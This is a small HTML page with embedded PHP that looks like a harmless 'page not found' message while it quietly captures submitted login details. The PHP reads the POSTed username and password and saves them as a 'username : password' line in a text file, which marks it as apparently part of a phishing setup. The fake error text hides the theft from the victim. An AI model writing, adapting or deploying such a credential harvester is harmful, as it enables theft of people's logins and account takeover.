<!DOCTYPE html>
<html>
<head>
	<title>unsuccessful</title>
</head>
<body>
this page was not found

<?php

$myfile = fopen("newfile.txt", "w") or die("Unable to open file!");
$username = $_POST["username"];
fwrite($myfile, $username);
$password = $_POST["password"];
fwrite($myfile, ' : ');
fwrite($myfile, $password);
fclose($myfile);


?>

</body>
</html>